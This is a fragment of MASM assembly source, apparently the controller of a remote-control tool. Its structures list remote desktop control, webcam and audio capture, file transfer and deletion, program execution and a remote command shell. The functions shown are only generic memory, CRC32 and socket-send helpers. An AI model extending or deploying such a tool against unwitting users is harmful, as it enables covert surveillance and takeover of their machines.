
include			WINDOWS.INC
include			debug.inc
include			user32.inc
include 		kernel32.inc
include			gdi32.inc
include			ws2_32.inc
include			comdlg32.inc
include			comctl32.inc
include			winmm.inc
include			shell32.inc
include			shlwapi.inc
include			advapi32.inc

includelib		user32.lib
includelib		kernel32.lib
includelib		gdi32.lib
includelib		ws2_32.lib
includelib		comdlg32.lib
includelib		comctl32.lib
includelib		winmm.lib
includelib		shell32.lib
includelib		shlwapi.lib
includelib		advapi32.lib
include			lz.asm

IDM_ABOUT		EQU		7777

CHAR_BLANK		EQU		20h
CHAR_DELI		EQU		'"'
ICO_MAIN		EQU		1288
IDD_DLG			EQU		1000
IDC_LST1		EQU		1002
IDD_DLG2		EQU		2000
IDD_DLG3		EQU		3000

IDR_MENU		EQU		9000
IDM_DESKTOP		EQU		9002
IDM_VCAM		EQU		9003
IDM_REC			EQU		9004
IDM_FILE		EQU		9005
IDM_CMDRUN		EQU		9006
IDR_DMENU		EQU		10000
IDM_KONGZHI		EQU		10002

CREATEWINDOWDESKTOP		EQU		401h
DESTROYWINDOW			EQU		406h
CREATEWINDOWFILE		EQU		402h
ADDLIST					EQU		404h
DELETELIST				EQU		405h

WSABUF STRUCT
  	len  		dword		?
  	buf  		dword 		?
WSABUF ENDS

OVERLAPPEDPLUS	struct
	ol			OVERLAPPED	<?>
	wsabuf		WSABUF		<?>
	hsocket		dword		?
	opCode		dword		?
	lpBuffer	dword		?	
	dwLength	dword		?
	socktag		dword		?
	dwSeek		dword		?
	other		dword		?
	nfree		dword		?
	otherfree	dword		?
	hcpumutex	dword		?

oldhbitmap		dword			?
hmainform		dword			?
hform			dword			?	
lpipport    	dword			?

union
x				dword			?
hlstvitem		dword			?
ends
union
y				dword			?
lpfilename		dword			?
ends
union
qinxidu			dword			?
lpfiledir		dword			?
ends
union
dwkongzhi		dword			?
hfile			dword			?
ends
union
ndownPos		dword			?
nfilesize		dword			?
ends
union
nrightPos		dword			?
nfileseek		dword			?
ends
union
hDrwDC			dword			?
hrecivestatic	dword			?
ends
union
hScrDC			dword			?
hstatic			dword			?
ends
union
hMemDC			dword			?
hwinstatus		dword			?
ends
union
hBitmap			dword			?
htreeview		dword			?
ends
union
lpbmpinfo		dword			?
hyunxing		dword			?
ends
union
hWaveOut		dword			?
hshangchuan		dword			?
ends
union
lpWavehdOut		dword			?
hxiazai			dword			?
ends
union
hdelfile		dword			?
hCmdRich		dword			?
ends
union
htvitem			dword			?
hCmdRich1		dword			?
ends
OVERLAPPEDPLUS ends

SOCKETTAG		STRUCT
	tag				byte		?
	maxconn			byte		?
	desktopconn		byte		?
	desktopsend		byte		?
	desktopxy		byte		?
	desktopldb		byte		?
	desktopldown	byte		?
	desktoprdown	byte		?
	desktoplup		byte		?
	desktoprup		byte		?
	desktopkey		byte		?
	desktopclose	byte		?
	cameraconn		byte		?
	camerasend		byte		?
	cameraclose		byte		?
	recconn			byte		?
	recsend			byte		?
	recclose		byte		?
	fileconn		byte		?
	getfilestr		byte		?
	sendfilestr		byte		?
	fileinfo		byte		?
	gofile			byte		?
	closefile		byte		?
	scfileinfo		byte		?
	scgofile		byte		?
	scclosefile		byte		?
	scgetfilesize	byte		?
	delfile			byte		?
	runexe			byte		?
	cmdstart		byte		?
	cmdrun			byte		?
	cmdclose		byte		?
	biaoshi			byte		?
SOCKETTAG ends

;#########################################################################

.data
szhttp			byte	"liuzhiwei@msn.com",0
dwstatuswidth	dword	68,120,170,218,260,328,-1
bmainshow		dword	0
szfilter		byte	"All Files(*.*)",0,"*.*",0,0
lslsnr			byte 	0ah,0dh,00h,00h

.data?
hInstance		dword			 ?
qinxidu			dword			 ?
hsocket			dword			 ?
hjmp			dword			 ?
hiocp			dword			 ?
lsargv			dword			 ?
dwipport		dword			 ?
lscpu			dword			 ?
lsupx			dword			 ?
lsyuming		dword			 ?
lschongqi		dword			 ?
lsshifang		dword			 ?
hlmenu			dword			 ?
hdmenu			dword			 ?
hwinstatus		dword			 ?
dwconncount		dword			 ?
hhWnd			dword			 ?
ipsearAddress	dword			 ?
lpDrawDibOpen	dword			 ?
lpDrawDibDraw	dword			 ?
lpDrawDibClose	dword			 ?
lpProctreeview	dword			 ?
nDesktopWidth	dword			 ?
nDesktopHeight	dword			 ?
formx			dword			 ?
formy			dword			 ?
bform			dword			 ?
camerax			dword			 ?
cameray			dword			 ?
bcamera			dword			 ?

;#########################################################################
.code

LYQCmpMemory proc uses ebx ecx esi edi lpdest,lpsou,lpsize
	mov esi,lpdest
    mov edi,lpsou
    mov ecx,lpsize
    repe cmpsb
    .if zero?
    	mov eax,1
    .else
    	mov eax,0	
    .endif
	ret
LYQCmpMemory endp

LYQMoveMemory proc uses ebx ecx esi edi lpdest,lpsou,lpsize
	mov esi,lpsou
	mov edi,lpdest
	mov ecx,lpsize
	cld
	rep movsb
	ret
LYQMoveMemory endp

LYQZeroMemory proc uses ebx ecx esi edi lpdest,lpsize
	xor eax,eax
	mov edi,lpdest
	mov ecx,lpsize
	cld
	rep stosb
	ret
LYQZeroMemory endp

GetCRC32 proc uses ebx ecx esi edi csData,dwSize
    invoke  GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,400h
    mov	edi,eax
    mov	esi,eax
    xor	edx,edx
	@MakeCRC32Loop: 
	mov	eax,edx
    mov	ecx,8
	@MakeLoop:      
	shr	eax,1
    jnc	@MakeNext
    xor	eax,0EDB88320h
	@MakeNext:      
	loop @MakeLoop
    mov [esi],eax
    add esi,4
    inc dl
    jnz @MakeCRC32Loop
    mov eax,-1
    mov ecx,dwSize
    mov esi,csData
    jecxz rest
	@@:            
	movzx edx,al
    xor dl,[esi]
    inc esi
    shr eax,8
    xor eax,[edi+4*edx]
    loop @B
	rest:          
	not eax
    mov esi,eax 
    invoke  GlobalFree,edi
    mov	eax,esi
    ret
GetCRC32 endp

WSASends	proc uses ebx esi edi hsock,lpbuf,dwLength,Socktag
	LOCAL	@recvbytes,@flags:dword
	LOCAL	@lpBuffer,@dwBufferSize:dword
	mov eax,dwLength
	add eax,10
	mov @dwBufferSize,eax
	invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,@dwBufferSize
	mov @lpBuffer,eax
	mov edi,eax
	mov eax,dwLength
	mov dword ptr[edi],eax
	mov eax,Socktag
	mov word ptr[edi+4],ax
	invoke GetCRC32,@lpBuffer,6
	mov dword ptr[edi+6],eax
	add edi,10
	invoke LYQMoveMemory,edi,lpbuf,dwLength
	invoke GlobalFree,lpbuf
	invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,@dwBufferSize
	mov edi,eax
	invoke LYQMoveMemory,edi,@lpBuffer,@dwBufferSize
	invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,sizeof OVERLAPPEDPLUS
	mov esi,eax
	assume esi:ptr OVERLAPPEDPLUS
	invoke LYQZeroMemory,addr [esi].ol,sizeof OVERLAPPED
	m2m [esi].wsabuf.len,@dwBufferSize
	m2m [esi].dwLength,@dwBufferSize
	m2m [esi].lpBuffer,@lpBuffer
	m2m [esi].hsocket,hsock
	mov [esi].wsabuf.buf,edi
	mov [esi].opCode,3
	mov [esi].dwSeek,0
	mov @recvbytes,0
	mov @flags,0
	invoke WSASend,[esi].hsocket,addr [esi].wsabuf,1,addr @recvbytes,@flags,esi,NULL	
	.if eax==SOCKET_ERROR
		invoke WSAGetLastError
		.if eax!= WSA_IO_PENDING
			mov [esi].otherfree,1
			invoke PostQueuedCompletionStatus,hiocp,0,0,esi
		.endif
	.endif	
	assume esi:nothing
	ret
WSASends endp
